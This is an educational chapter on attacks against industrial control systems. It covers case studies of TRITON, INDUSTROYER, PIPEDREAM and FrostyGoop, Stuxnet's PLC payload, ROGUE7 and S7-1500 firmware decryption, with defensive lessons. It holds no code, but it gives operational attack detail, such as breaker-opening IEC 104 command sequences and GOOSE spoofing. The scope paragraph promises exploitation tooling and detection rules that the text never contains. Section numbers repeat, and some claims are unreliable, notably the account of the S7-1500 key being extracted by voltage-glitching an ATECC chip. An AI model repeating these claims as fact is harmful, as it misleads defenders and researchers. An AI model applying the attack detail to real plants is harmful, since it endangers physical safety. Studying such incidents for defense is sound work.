# Domain 16, Chapter 16B — ICS/OT Attack Case Studies, Network Architecture, and Defense

> **Scope.** Deep technical analysis of ICS-targeted malware: TRITON/TRISIS framework internals (Triconex architecture, TriStation protocol, SIS payload injection, CVE-2018-7522), INDUSTROYER/CrashOverride module architecture (IEC 104 attack sequences, GOOSE spoofing, OPC DA enumeration, INDUSTROYER2 evolution, Sandworm attribution), PIPEDREAM/INCONTROLLER (CHERNOVITE actor, EVILSCHOLAR/Schneider exploitation, BADOMEN/Omron FINS, MOUSEHOLE/OPC UA, DUSTTUNNEL C2), FrostyGoop/BUSTLEBERM (Modbus TCP attacks on heating infrastructure). PLC exploitation: Siemens S7-1500 firmware decryption (Claroty Team82), PLC rootkits, Stuxnet PLC payload, ROGUE7 MITM, Codesys V3 runtime vulnerabilities, PLC memory layout attacks. ICS network architecture: Purdue model implementation, data diodes, IEC 62443 zones/conduits, DMZ design, historian placement, remote access. ICS protocol exploitation tools: Scapy Modbus crafting, pymodbus exploitation, python-snap7 S7comm exploitation, ISF/Metasploit ICS modules, pycomm3 EtherNet/IP, Codesys exploitation, Omron FINS crafting, DNP3 manipulation, OPC UA exploitation with opcua-asyncio. ICS detection rules: Sigma rules (TRITON/INDUSTROYER/PIPEDREAM indicators), Suricata rules (Modbus/S7comm/IEC 104/Codesys/GOOSE), YARA rules (ICS malware families), Zeek ICS protocol monitoring. OT workstation hardening: Sysmon OT configuration, WDAC/AppLocker policies, GPO settings, nftables/Windows Firewall microsegmentation. ICS incident response code: Velociraptor VQL for OT triage, Wireshark ICS filters, python-snap7 golden image verification, historian SQL forensics. ICS CVE reference table: Codesys, Siemens S7, Schneider Modicon, Rockwell, TRITON, INDUSTROYER, Stuxnet CVE mappings. ICS detection engineering: protocol anomaly detection, PLC program integrity monitoring, OT threat hunting. ICS incident response: process safety, PLC forensics, historian-based timeline reconstruction, safe shutdown. Regulatory frameworks: IEC 62443, NERC CIP, NIST 800-82, NIS2, TSA Pipeline Directives.

---

## 1. TRITON/TRISIS deep technical analysis

### 1.1 Triconex Safety Instrumented System architecture

The Schneider Electric Triconex is a Triple Modular Redundant (TMR) safety controller used in petrochemical, nuclear, and critical infrastructure facilities as the Safety Instrumented System (SIS). The SIS is the last automated layer of protection between a process upset and a catastrophic event (explosion, toxic release, equipment destruction). The Triconex architecture runs three independent processor modules (Main Processors, or MPs) executing the same safety program simultaneously. Each MP independently reads inputs, executes the safety logic, and produces outputs. A two-out-of-three voting mechanism compares the three outputs — the majority vote determines the actual output. If one MP disagrees (due to hardware fault or software error), the other two outvote it, and the faulty MP is flagged for maintenance.

The TriStation protocol is the proprietary communication interface between the engineering workstation (running Triconex TriStation 1131 software) and the Triconex controller. TriStation operates over a dedicated network connection (Ethernet, separate from the process control network in a properly configured deployment). The protocol provides: program download and upload, memory read and write, controller state changes (RUN, PROGRAM, HALT), and diagnostic queries. TriStation uses a simple command-response format with function codes analogous to Modbus but with proprietary encoding.

### 1.2 TRITON framework internals

The TRITON framework (also called TRISIS or HatMan by different researchers) was discovered in December 2017 at a petrochemical facility in Saudi Arabia, attributed to the Central Scientific Research Institute of Chemistry and Mechanics (TsNIIMASH/CNIIHM), a Russian government-owned research institution in Moscow. The attack chain proceeded through several stages.

First, the attackers compromised the facility's IT network (likely via spear-phishing), performed lateral movement to the OT network (crossing the IT/OT boundary through inadequately segmented jump servers or dual-homed workstations), and gained access to the SIS engineering workstation — a Windows workstation running TriStation 1131 and connected to the Triconex controller via the dedicated safety network.

The TRITON framework consisted of several components. `trilog.exe` was the main orchestrator, a Python script compiled with py2exe, masquerading as a Triconex log-review utility. It implemented the TriStation protocol from scratch, communicating directly with the Triconex controller over the network. The TriStation protocol implementation was reverse-engineered by the attackers — no public documentation of the protocol existed, indicating significant reverse-engineering effort (possibly involving analysis of TriStation 1131 network traffic and the TriStation DLLs).

The payload consisted of two binary blobs: `inject.bin` (the injector) and `imain.bin` (the backdoor payload). The injector exploited CVE-2018-7522 (improper input validation in the Triconex firmware's program-upload handler) to write the `imain.bin` payload into the Triconex controller's memory, specifically into an area that would survive a power cycle and execute alongside the legitimate safety program. The `imain.bin` payload was a position-independent ARM binary (the Triconex MPs use an ARM processor) that provided: the ability to read and write arbitrary memory on the Triconex controller, the ability to modify the running safety program (disabling specific safety functions — for example, removing the logic that trips a safety shutdown on high temperature or high pressure), and a network-accessible command interface for the attacker to send instructions to the compromised SIS.

### 1.3 Attack chain and lateral movement

The TRITON intrusion involved a multi-year campaign. FireEye/Mandiant's incident response revealed the attacker's progression through the facility's networks. Initial access occurred through the corporate IT network — likely via a strategic web compromise or spear-phishing targeting facility personnel. The attacker established persistent access to the IT network and conducted extensive reconnaissance over several months.

Pivoting from IT to OT required crossing the IT/OT boundary. The investigation revealed that the boundary between the corporate network and the DCS (Distributed Control System) network was inadequately segmented — a dual-homed engineering workstation (connected to both networks) or a poorly configured firewall provided the crossing point. Once on the DCS network, the attacker performed further reconnaissance, identifying the SIS engineering workstation.

The SIS engineering workstation was the critical final pivot. In a properly configured environment, the SIS engineering workstation should be on a physically separate network (the safety network), accessible only to authorized safety engineers, and connected to the Triconex controller through a dedicated Ethernet connection. In the compromised facility, the SIS engineering workstation had network connectivity to the DCS network — a configuration violation that enabled the attacker to reach it from the DCS network without physical access to the safety network.

On the SIS engineering workstation, the attacker deployed the TRITON framework. The framework communicated with the Triconex controller using the TriStation protocol. The TriStation protocol had no authentication mechanism — any device that could reach the Triconex controller on the correct TCP port could send TriStation commands. The attacker's framework authenticated (trivially — the protocol accepted any connection) and began the payload injection process.

### 1.4 Detection and implications

The attack was detected when the injected code caused an unintended SIS trip (emergency shutdown). The TRITON payload had a bug: it attempted to modify the safety program while the program was executing, and the modification corrupted the program state on one of the three MPs. The TMR voting mechanism detected the inconsistency between the corrupted MP and the two healthy MPs and triggered a diagnostic shutdown. Plant operators, investigating the unexpected trip, discovered the TRITON framework on the engineering workstation.

The incident revealed that the attacker had been in the OT network for months before deploying TRITON — the initial intrusion occurred in 2014, and the TRITON deployment occurred in 2017. During this extended dwell time, the attacker mapped the facility's control system architecture, identified the SIS as the target, reverse-engineered the TriStation protocol, and developed the TRITON framework. The extended timeline suggests a patient, well-resourced adversary with long-term strategic objectives.

The safety implications are profound. If the TRITON attacker had successfully disabled the SIS without detection and simultaneously manipulated the process control system (DCS) to drive the process outside safe operating parameters, the result could have been an explosion, toxic release, or other catastrophic event. TRITON represents the first publicly known cyber attack with the explicit intent to cause physical harm or loss of life.

Defense lessons: SIS engineering workstations must be air-gapped from DCS networks (physically separate network, no IP routing between them). SIS controllers must require cryptographic authentication for all programming operations. SIS program changes must require physical key-switch authorization at the controller (many Triconex deployments have a key switch that must be in the PROGRAM position to accept program downloads — this was reportedly not enforced at the compromised facility). The TMR voting mechanism, while not designed as a security control, inadvertently served as detection — however, a more carefully implemented payload that made consistent changes across all three MPs would not have triggered this detection. Regular SIS program integrity checks (downloading and hash-comparing the running program against the golden image) are essential.

---

## 2. INDUSTROYER deep technical analysis

### 2.1 Module architecture and operational context

INDUSTROYER (also called CrashOverride) was deployed against the Ukrainian power grid in December 2016, causing a one-hour blackout in the Kyiv region affecting approximately 230,000 customers. The malware, attributed to Sandworm (GRU Unit 74455), demonstrated unprecedented sophistication in its multi-protocol ICS attack capability and represented a significant escalation from the 2015 BlackEnergy-based grid attack.

The 2015 attack (BlackEnergy) was relatively manual — operators used the compromised HMI to manually open circuit breakers, a process requiring human judgment and real-time interaction. INDUSTROYER automated the entire attack sequence: no human operator interaction was required during the grid manipulation phase. The malware received a single execution command, and the pre-programmed attack sequence (enumerate targets, open breakers, disable reclosing, disable protection relays, wipe evidence) executed autonomously. This automation represented a capability upgrade from "remote operator using stolen SCADA access" to "autonomous malware executing a pre-planned grid attack" — a capability that scales to simultaneous attacks on multiple substations without proportionally scaling the attacker's human resources.

The framework consisted of a main backdoor (a Windows service named "defragsvc" providing C2 communication via HTTP to a TOR-hidden service), a launcher component (a DLL that loaded and executed the ICS-specific modules at a configured time — the attack was scheduled for midnight local time on December 17, 2016), four ICS protocol modules (each targeting a different ICS protocol, each compiled as a separate DLL), and a data wiper component (a modified version of the Siemens SIPROTEC denial-of-service tool combined with a module that overwrites system files and the MBR to prevent recovery).

The main backdoor used TOR for C2 communication, providing network anonymity. The TOR client was deployed alongside the backdoor on the compromised SCADA workstation. The use of TOR in an OT environment is an anomaly indicator — TOR traffic from a SCADA workstation should never occur in a properly configured environment and is detectable through network monitoring (TOR guard node IP addresses are publicly listed, and TOR traffic has distinctive packet-size and timing patterns).

### 2.2 IEC 60870-5-104 module

The IEC 104 module was the primary attack vector. IEC 104 (the TCP variant of IEC 60870-5) is the SCADA protocol used in European and Asian electric utility substations for telecontrol — sending commands to and receiving telemetry from substation equipment (circuit breakers, disconnectors, tap changers).

The module's attack sequence began with establishing a TCP connection to the IEC 104 slave (the substation's RTU or gateway) on port 2404. It sent a STARTDT (Start Data Transfer) activation frame to initiate the IEC 104 communication session. It then performed a Station Interrogation (sending a C_IC_NA_1 — Interrogation Command — to retrieve the current state of all information objects in the station). This provided the module with a map of all controllable objects (circuit breakers, disconnectors) and their current state (open/closed).

The module then systematically sent Single Command (C_SC_NA_1) and Double Command (C_DC_NA_1) frames to open every circuit breaker in the substation. The commands were sent with the Select-Before-Operate (SBO) sequence — first a SELECT command (testing whether the operation is permitted), then an EXECUTE command (performing the operation). The SBO sequence mimics the behavior of a legitimate SCADA operator, making the attack less likely to be flagged by simple protocol-compliance monitoring.

After opening all circuit breakers (disconnecting the substation from the grid), the module sent additional commands to disable the automatic reclosing function — preventing the grid operators from remotely restoring power by simply closing the breakers.

### 2.3 IEC 61850 GOOSE module

The GOOSE (Generic Object-Oriented Substation Event) module operated at Layer 2, directly crafting Ethernet frames with the GOOSE EtherType (0x88B8). GOOSE messages are multicast — every device on the substation LAN receives them. The module spoofed GOOSE messages with the highest priority (highest stNum/sqNum values), causing receiving IEDs to process the spoofed messages in preference to legitimate ones. The spoofed GOOSE messages commanded circuit breakers to open, achieving the same effect as the IEC 104 module but through a different protocol path.

GOOSE's Layer 2 operation means it bypasses all IP-based firewalls and network segmentation. A GOOSE spoofer only needs Layer 2 connectivity to the substation LAN — a compromised device on the substation Ethernet network can inject GOOSE messages without any IP address or TCP connection. This makes GOOSE particularly dangerous in substations with flat Layer 2 networks (no VLAN segmentation between protection IEDs).

Detection: IEC 62351-6 specifies HMAC-based authentication for GOOSE messages (appending an authentication value to each GOOSE frame), but adoption requires all IEDs to support the authentication extension. GOOSE monitoring tools (Claroty, Nozomi) detect anomalous GOOSE traffic by maintaining a baseline of legitimate GOOSE publishers and their expected message patterns — a new publisher or an unexpected stNum sequence triggers an alert.

### 2.4 OPC DA module

The OPC DA module used DCOM (Distributed COM) to enumerate OPC DA servers on the substation network, discover their address spaces (browsing the OPC item hierarchy), and read/write process data. OPC DA's DCOM transport provides a rich attack surface: the DCOM protocol requires multiple TCP connections (DCOM uses dynamic port allocation), and OPC DA's security relies on Windows authentication (NTLM or Kerberos) and DCOM permission settings — which in many OT environments are configured for maximum compatibility (anonymous access, no encryption).

The OPC DA module's enumeration capability provided the attacker with a detailed view of the substation's process state: every measurement point (voltages, currents, power flows, transformer tap positions, breaker states) was readable through the OPC item hierarchy. This reconnaissance data informed the IEC 104 module's targeting — the attacker knew exactly which IOAs corresponded to which circuit breakers.

### 2.5 Data wiper and anti-recovery

The data wiper component served multiple purposes: destroying forensic evidence on compromised workstations (overwriting the MBR, system files, and the INDUSTROYER components themselves), preventing operators from using the SCADA system to restore power (forcing manual intervention at each substation), and specifically targeting the firmware of Siemens SIPROTEC protection relays via the CVE-2015-5374 denial-of-service vulnerability — sending a crafted packet to port 4443 that causes the relay to become unresponsive (requiring manual power cycling at the substation). The SIPROTEC attack was particularly insidious: even after the circuit breakers were manually closed and power restored, the protection relays remained non-functional, leaving the power system operating without fault protection — any subsequent electrical fault (a common occurrence in power systems) could cause cascading damage.

The combination of attacking the SCADA system (opening breakers), targeting the protection system (disabling SIPROTEC relays), and destroying the operator's tools (wiping workstations) represented a layered attack designed to maximize disruption duration and complicate recovery. The operational sequence was clearly timed: the data wiper was scheduled to execute at a specific time (midnight), giving the IEC 104 module time to open breakers and the SIPROTEC module time to disable protection before the evidence was destroyed.

### 2.5 INDUSTROYER2 and attacker evolution

**Sandworm attribution.** INDUSTROYER was attributed to Sandworm (GRU Unit 74455, also known as Voodoo Bear, Telebots, or IRIDIUM) based on: shared malware code and infrastructure with previous Sandworm operations (NotPetya, BlackEnergy, Olympic Destroyer), victimology consistent with Russian strategic interests, and operational indicators (timing, targeting, and tactical objectives aligned with Russian military operations in Ukraine). The US Department of Justice indicted six GRU officers associated with Sandworm in October 2020 for their roles in the Ukrainian grid attacks, NotPetya, and other operations.

INDUSTROYER2, deployed in April 2022 against Ukrainian high-voltage substations, was a simplified version: only the IEC 104 module, compiled as a single executable with hardcoded target IP addresses and IOA (Information Object Address) mappings. The simplification suggests either time pressure (the attacker needed to deploy quickly in the context of the kinetic conflict) or operational security considerations (a single executable is easier to deploy and less likely to be detected during lateral movement than the multi-component INDUSTROYER framework). CERT-UA and ESET detected and mitigated INDUSTROYER2 before it could cause a sustained blackout, demonstrating that the defensive lessons from 2016 had been partially internalized by Ukrainian operators. The detection was enabled by network monitoring deployed after the 2016 incident — continuous monitoring of IEC 104 traffic allowed CERT-UA to identify the INDUSTROYER2 executable before its scheduled activation time and neutralize it. This represents a measurable improvement in Ukrainian critical infrastructure cyber defense between 2016 and 2022, driven directly by the lessons and investments from the first INDUSTROYER incident.

---

## 3. PIPEDREAM/INCONTROLLER deep dive

### 3.1 Framework architecture and attribution

PIPEDREAM (Dragos designation) / INCONTROLLER (Mandiant designation) was disclosed jointly by Dragos, Mandiant, and CISA in April 2022. The framework was discovered before deployment, making it the first ICS-targeting malware to be publicly analyzed before it was used in an attack. Dragos attributed it to the CHERNOVITE activity group.

PIPEDREAM represents the industrialization of ICS attack capability — a modular, cross-vendor, cross-protocol toolkit that could be adapted to target a wide range of industrial environments. Unlike TRITON (which targeted a specific SIS model at a specific facility) or INDUSTROYER (which targeted Ukrainian power grid protocols), PIPEDREAM was designed for broad applicability — it could be deployed against water treatment plants, manufacturing facilities, oil and gas operations, or power generation stations with minimal customization.

The framework's design philosophy reflected a shift in ICS threat actor tradecraft: from one-off, operation-specific malware development to reusable, modular toolkits that reduce the per-operation development cost and enable rapid adaptation to new targets. This mirrors the evolution of IT-side offensive tools (Cobalt Strike, Metasploit) from custom exploits to reusable frameworks. The framework consisted of four components, each targeting different ICS technologies.

### 3.2 EVILSCHOLAR: Schneider Modicon exploitation

EVILSCHOLAR targeted Schneider Electric Modicon M251/M258/M241 PLCs. These PLCs run the Codesys V3 runtime — a software PLC runtime used by over 500 industrial automation vendors. EVILSCHOLAR exploited the Codesys V3 runtime's management interface (TCP port 11740) to: authenticate (using default or brute-forced credentials), upload arbitrary programs to the PLC (replacing the legitimate control logic), download the current program (for reconnaissance — understanding the process being controlled), and manipulate the PLC's running state (stop, start, reset).

The Codesys V3 runtime vulnerabilities exploited by EVILSCHOLAR (CVE-2021-29240 series — 15 vulnerabilities including authentication bypass, buffer overflows, and information disclosure) affected not just Schneider PLCs but hundreds of other vendors' PLCs running the same Codesys runtime. This cross-vendor impact is a distinguishing characteristic of PIPEDREAM — exploiting the shared software platform rather than the individual vendor's product.

EVILSCHOLAR's Schneider-specific capabilities included: reading the PLC's running configuration (identifying the firmware version, installed modules, and network configuration), downloading the current PLC program (intellectual property theft and process reconnaissance), uploading a replacement program (installing attacker-controlled logic), and forcing a PLC reboot (interrupting the controlled process). The replacement program could contain arbitrary IEC 61131-3 logic — any combination of ladder logic, structured text, or function block diagram that the attacker designed. This means the attacker could: shut down a process (inserting a STOP command in the main program cycle), manipulate outputs (opening valves, starting motors, changing setpoints), or install a time-bomb (logic that executes normally for weeks/months, then activates a destructive sequence at a predetermined trigger).

The Codesys Gateway protocol (used for routing connections from the engineering IDE through intermediate devices to the target PLC) provided an additional attack surface. EVILSCHOLAR could use the Gateway to reach PLCs that were not directly network-accessible — if the attacker could reach any Codesys device on the network, the Gateway routing could forward connections to other Codesys devices on connected networks, effectively pivoting through the ICS architecture.

### 3.3 BADOMEN: Omron exploitation

BADOMEN targeted Omron NX/NJ-series PLCs via the HTTP management interface and the FINS (Factory Interface Network Service) protocol. FINS is Omron's proprietary industrial protocol (UDP port 9600) that provides read/write access to PLC memory areas (CIO, WR, HR, AR, DM, EM), program upload/download, and PLC mode control. BADOMEN used the HTTP management interface for initial authentication and reconnaissance (reading the PLC's configuration, firmware version, and network settings), then used FINS for direct PLC manipulation (memory read/write, program modification).

The Omron NX/NJ PLCs are modern, Ethernet-connected controllers used in manufacturing, packaging, and motion-control applications. BADOMEN's capability to modify the PLC's program and memory means it could alter the control logic governing physical processes — changing motor speeds, disabling safety interlocks, modifying recipe parameters, or halting production lines.

BADOMEN's HTTP-based initial reconnaissance exploited the NX/NJ's web management interface, which provides: device identification (model, firmware version, serial number), network configuration (IP address, subnet, gateway, DNS), module inventory (which I/O modules are installed, their types and configurations), and system status (run mode, error state, CPU utilization). This information enabled BADOMEN to identify the specific PLC model and firmware version, select the appropriate exploitation technique, and understand the PLC's I/O configuration (which determines what physical equipment is connected).

The FINS protocol's memory access model divides the PLC's data into areas: CIO (Core I/O — digital inputs and outputs), WR (Work bits — internal flags), HR (Holding bits — retained across power cycles), AR (Auxiliary bits — system status), DM (Data Memory — general-purpose data storage), and EM (Extended Memory — additional data storage). BADOMEN could read and write all memory areas, providing both reconnaissance capability (reading CIO to understand the current state of all I/O points, reading DM to understand setpoints and parameters) and manipulation capability (writing to CIO to override output states, writing to DM to change setpoints). The FINS protocol does not require authentication in its default configuration — any device that can reach the PLC on UDP port 9600 can send FINS commands.

### 3.4 MOUSEHOLE: OPC UA reconnaissance and manipulation

MOUSEHOLE was an OPC UA reconnaissance and manipulation tool with capabilities that exploited both the open standard's richness and its implementation weaknesses. Its OPC UA client implementation supported: server discovery (broadcasting OPC UA FindServers and GetEndpoints requests to identify OPC UA servers on the network), security enumeration (testing which security policies each server supports — None, Basic128Rsa15, Basic256, Basic256Sha256, Aes128Sha256RsaOaep, Aes256Sha256RsaPss — to identify servers accepting unencrypted connections), authentication testing (attempting anonymous, username/password with default credentials, and certificate-based authentication), and node browsing (traversing the OPC UA address space to enumerate all available nodes, including their names, data types, access levels, and current values).

OPC UA's information model is exceptionally rich compared to older ICS protocols. Each node in the address space has a human-readable BrowseName (e.g., "ReactorTemperature", "PumpSpeed_1", "EmergencyStop_Status"), engineering units (°C, RPM, PSI), value range constraints, and access level flags (read-only, read-write). This metadata gives an attacker — or MOUSEHOLE's operator — a detailed semantic map of the controlled process without requiring process engineering expertise. An attacker who enumerates an OPC UA server's address space knows: what physical process is being controlled, what sensors measure which variables, what actuators are available, and which variables are writable (indicating controllable parameters).

MOUSEHOLE's write capability enabled direct process manipulation through OPC UA — writing to writable nodes changes setpoints, opens/closes valves, starts/stops motors. Because OPC UA provides a high-level semantic interface (the attacker writes to a named variable like "ReactorTemp_SP" rather than an anonymous register address like Modbus register 40001), the manipulation requires less process-specific knowledge than raw protocol attacks.

### 3.5 DUSTTUNNEL: OT-specific C2

DUSTTUNNEL was a custom C2 implant designed specifically for maintaining persistent access to compromised OT network hosts. Unlike IT-focused C2 frameworks (Cobalt Strike, Mythic) that rely on HTTP/HTTPS callbacks to internet-accessible C2 servers, DUSTTUNNEL was designed to operate in air-gapped or heavily firewalled OT environments where internet connectivity is restricted or absent.

DUSTTUNNEL provided encrypted command-and-control communication (tunneled through protocols that are permitted through OT firewalls), file transfer (for deploying additional tools or exfiltrating data), and remote command execution. The implant's design for OT-specific operational constraints — intermittent connectivity, restricted outbound traffic, environments where EDR and endpoint security are often absent — demonstrates the attacker's operational awareness of OT network characteristics.

DUSTTUNNEL's presence indicated that PIPEDREAM was designed for prolonged operations — not a one-time destructive attack but a persistent foothold enabling repeated access to the OT network for reconnaissance, process manipulation, and delayed impact attacks. This operational model mirrors the extended dwell times observed in the TRITON campaign (three years between initial access and SIS exploitation) and the BlackEnergy campaign (months of reconnaissance before the grid attack).

### 3.5 FrostyGoop/BUSTLEBERM (2024)

FrostyGoop (Dragos designation) / BUSTLEBERM represented a significant evolution: purpose-built Modbus TCP attack tooling used against Ukrainian heating infrastructure in January 2024. The malware connected to Modbus TCP devices (ENCO controllers managing heating substations) and sent Write Multiple Registers (function code 16) commands to modify temperature setpoints and controller configurations, disrupting heating service to approximately 600 apartment buildings in Lviv during sub-zero temperatures.

FrostyGoop's significance lies in its simplicity and replicability. Unlike TRITON or INDUSTROYER, which required deep proprietary protocol knowledge, FrostyGoop used standard Modbus TCP — a protocol so simple that a Python script with pymodbus can achieve the same effect. This demonstrated that ICS attacks do not require sophisticated nation-state malware development programs; the protocols themselves are the vulnerability. FrostyGoop also communicated over port 502 (standard Modbus TCP), making it difficult to distinguish from legitimate SCADA traffic without deep content inspection.

Detection of FrostyGoop-style attacks requires: monitoring Modbus TCP traffic for Write commands from unauthorized source IP addresses (any source other than the known SCADA server should not be sending Modbus writes to field controllers), baselining normal register write patterns (which registers are written, at what frequency, with what value ranges — a write to a temperature setpoint register changing the value from 70°C to 0°C is anomalous), and monitoring for Modbus connections from external network segments (FrostyGoop reached the controllers from the internet because the ENCO controllers were exposed on public IP addresses without firewall protection — a tragically common misconfiguration in small utility installations).

### 3.6 Additional ICS attack campaigns

**Ukraine power grid 2015 (BlackEnergy/Sandworm).** The first publicly confirmed cyber-induced power outage. The attack chain: spear-phishing emails with malicious Excel macros → BlackEnergy3 backdoor on corporate IT → lateral movement to SCADA network → operators' credentials captured → remote access to HMI workstations → manual operation of SCADA controls to open circuit breakers → KillDisk wiper deployed to destroy SCADA workstations → telephone DDoS against utility call centers (preventing customers from reporting outages, delaying response). The manual nature of the SCADA manipulation (human operators using the HMI rather than automated malware) was notable — it required real-time human involvement during the attack, which increased operational risk for the attackers but reduced the development complexity (no protocol-specific malware was needed for the actual grid manipulation).

**Oldsmar water treatment (2021).** A remote access intrusion at the Oldsmar, Florida water treatment plant. The attacker gained access through TeamViewer (a remote desktop application installed on the SCADA workstation for vendor support). The attacker briefly increased the sodium hydroxide (lye) setpoint from 100 ppm to 11,100 ppm — a potentially dangerous level if applied to the water supply. An alert operator noticed the cursor moving on the HMI screen and immediately reverted the change. The water treatment process had multiple downstream safety checks (pH monitoring, chlorine monitoring) that would have caught the elevated lye concentration before it reached consumers, but the incident highlighted the risk of remote access tools with weak authentication (TeamViewer was reportedly configured with a shared password, no MFA, and was accessible from the internet).

**Kemuri Water Company (Verizon DBIR, 2016).** An unnamed water utility's SCADA system was accessible via an internet-facing AS/400 system. The attacker modified the chemical treatment parameters (chlorine dosing, filtration settings) and accessed 2.5 million customer records. The AS/400 system used default credentials and provided direct connectivity to the SCADA network with no segmentation.

These incidents demonstrate a pattern: the most impactful ICS attacks often exploit weak IT/OT boundaries, remote access misconfigurations, and default credentials — not sophisticated protocol-level exploits. The MITRE ATT&CK for ICS framework captures these patterns: T0886 (Remote Services) and T0859 (Valid Accounts) are among the most commonly observed initial access techniques in ICS compromises.

---

## 4. PLC exploitation deep dive

### 4.1 Stuxnet's PLC payload

Stuxnet (discovered 2010, operational 2007–2010) remains the most technically sophisticated ICS attack ever analyzed. The PLC payload targeted Siemens S7-315 and S7-417 PLCs controlling uranium enrichment centrifuges at Iran's Natanz facility. The payload was delivered via the engineering workstation (infected with Stuxnet through USB propagation and multiple Windows zero-days) and injected into the PLC through the Step 7 engineering software.

Stuxnet modified Organization Block 35 (OB35), the 100-ms cyclic interrupt block in the Siemens S7 program architecture. OB35 is called every 100 ms by the PLC runtime and is typically used for closed-loop control (PID regulation). Stuxnet's OB35 replacement contained the attack logic: it periodically commanded the frequency converters (manufactured by Fararo Paya and Vacon) driving the centrifuge motors to alternate between 1,410 Hz and 2 Hz (the normal operating frequency was 1,064 Hz). This rapid acceleration and deceleration caused mechanical resonance and bearing failure in the centrifuges, destroying them over weeks while avoiding immediate catastrophic failure.

The concealment mechanism was equally sophisticated. Stuxnet intercepted reads from the PLC's input memory (the I area, containing sensor data) and substituted pre-recorded legitimate values. When the SCADA HMI or the engineering workstation read the PLC's inputs (centrifuge speed, vibration), they received the pre-recorded "normal" values — the operators saw a perfectly functioning centrifuge cascade while the actual centrifuges were being destroyed. This "man-in-the-middle" between the PLC and the HMI is a pattern that later attacks (TRITON, ROGUE7) would refine.

Stuxnet also modified the Step 7 project file (the .s7p file containing the PLC program) on the engineering workstation. When the engineer opened the project in Step 7, the displayed ladder logic appeared normal — the malicious modifications were hidden in the compiled binary, not visible in the engineering tool's source view. This undermined the engineering tool's role as a verification mechanism — the engineer could not trust what Step 7 showed them.

**Stuxnet's process knowledge.** The precision of Stuxnet's PLC payload revealed deep knowledge of the Natanz enrichment facility's specific process parameters. The attacker knew: the exact model of frequency converter (Fararo Paya and Vacon), the normal operating frequency (1,064 Hz), the centrifuge cascade configuration (IR-1 centrifuges in cascades of 164), the S7-315/S7-417 PLC firmware version, and the specific data block (DB890) containing the centrifuge operating parameters. This process-specific knowledge suggests either: intelligence collection from inside the facility (HUMINT), signals intelligence intercepting engineering communications (SIGINT), or access to a replica of the Natanz centrifuge cascade (a test facility where the attack could be developed and validated before deployment). Reports suggest the US and Israel operated a replica cascade at the Idaho National Laboratory and the Dimona nuclear facility in Israel for testing Stuxnet's payload.

**Impact assessment.** Stuxnet reportedly destroyed approximately 1,000 of the 5,000 IR-1 centrifuges at Natanz between 2007 and 2010. The destruction was gradual and appeared to be a quality-control problem (bearing failures, rotor cracks), delaying Iran's suspicion of cyber attack. The IAEA (International Atomic Energy Agency) observed elevated centrifuge replacement rates during this period but did not initially attribute them to a cyber attack. Stuxnet's effectiveness was limited by its eventual discovery in June 2010 (when the worm spread beyond Natanz to other industrial systems worldwide, triggered by overly aggressive propagation logic), and by Iranian countermeasures (replacing compromised PLCs, re-imaging engineering workstations, and eventually air-gapping the enrichment control network more rigorously).

**Stuxnet's delivery mechanism.** Stuxnet propagated via USB drives (exploiting the Windows LNK vulnerability CVE-2010-2568 for automatic execution when a USB drive was inserted), network shares (SMB exploitation via MS08-067), Step 7 project files (infecting .s7p files so that any engineer who opened a Stuxnet-infected project file on a clean engineering workstation became infected), and the Windows print spooler (MS10-061). The USB propagation was the primary crossing mechanism for the air gap between the internet and the Natanz facility — an insider (witting or unwitting) carried an infected USB drive into the facility. Stuxnet used four Windows zero-day exploits simultaneously — an unprecedented concentration of zero-days in a single malware sample.

### 4.2 ROGUE7 and engineering tool MITM

ROGUE7 (Biham, Bitan, Doley, Leitner, Nass, 2019, Technion) demonstrated a man-in-the-middle attack between TIA Portal (Siemens' engineering software) and the S7-1500 PLC. The attack exploited weaknesses in the S7comm-plus protocol's session establishment and authentication mechanism.

S7comm-plus (the successor to the insecure S7comm protocol) adds session keys, anti-replay nonces, and integrity protection. However, the researchers found that the session key derivation was based on a fixed public key embedded in the TIA Portal software — extractable through reverse engineering. By extracting this key, they could establish an authenticated session with the PLC, impersonating a legitimate TIA Portal instance.

The ROGUE7 attack demonstrated: reading the PLC's program (intellectual property theft), modifying the PLC's program (injecting malicious logic), and — most importantly — presenting a different view of the program to the engineering tool than what was actually running on the PLC. The engineer, checking the PLC's program through TIA Portal, would see the legitimate program, while the PLC executed a modified version. Siemens addressed ROGUE7 in firmware updates that strengthened the S7comm-plus authentication mechanism.

### 4.3 S7-1500 firmware decryption

Claroty's Team82 (2022) achieved a breakthrough in Siemens S7-1500 PLC security analysis. Siemens had encrypted the S7-1500 firmware using AES-256, preventing security researchers from analyzing the firmware for vulnerabilities. The encryption key was derived from a hardware-specific identifier — each PLC model had a unique key, and the key was stored in a custom ATECC CryptoAuthentication chip on the PLC's CPU board.

Team82 extracted the firmware decryption key through a multi-stage hardware attack: (1) identifying the ATECC chip on the S7-1500 CPU board through PCB analysis (Domain 17C §2), (2) extracting the key from the ATECC chip using voltage glitching (Domain 17B §2) to bypass the chip's readout protection, and (3) using the recovered key to decrypt the firmware. The decrypted firmware revealed the S7-1500's internal architecture: the PLC runtime, the S7comm-plus protocol implementation, the program execution engine, and potential vulnerability surfaces.

This research demonstrated that hardware-based firmware protection, while a significant barrier, is not impenetrable against a skilled attacker with physical access and fault-injection capability. Siemens subsequently revised the S7-1500 hardware to use a more secure key-storage mechanism.

The decrypted firmware analysis revealed the S7-1500's internal architecture in unprecedented detail. The PLC runs a real-time operating system (RTOS) with a custom scheduler for executing the user program's Organization Blocks (OBs) at their configured cyclic intervals. The S7comm-plus protocol handler processes incoming network requests and dispatches them to the appropriate internal service. The firmware contains a built-in web server (for diagnostic access), an OPC UA server (for industrial data exchange), and the engineering tool communication handler. Each of these components represents a potential vulnerability surface — buffer overflows in packet parsers, authentication bypass in the engineering interface, and logic errors in the access control enforcement.

The broader implication: PLC firmware analysis enables vulnerability research that was previously impossible. Without firmware access, security researchers could only test PLCs as black boxes — sending protocol messages and observing responses. With firmware access (through decryption or extraction), researchers can perform static analysis (disassembly, decompilation) to identify vulnerabilities in the PLC's code, develop targeted exploits, and understand the PLC's internal security mechanisms (and their weaknesses). This shifts the PLC security model from "security through obscurity" (relying on encrypted firmware to prevent analysis) to "security through design" (the firmware must be secure even if an attacker has full knowledge of its implementation).

### 4.4 PLC rootkits and logic manipulation

A PLC rootkit is malicious code that hides below the visibility of the engineering tool — the engineer sees a legitimate program in TIA Portal, TriStation, or RSLogix, but the PLC executes different logic. The concept was demonstrated by researchers at Airbus and Black Hat (2015–2016) and has been observed in the wild (Stuxnet's OB35 replacement).

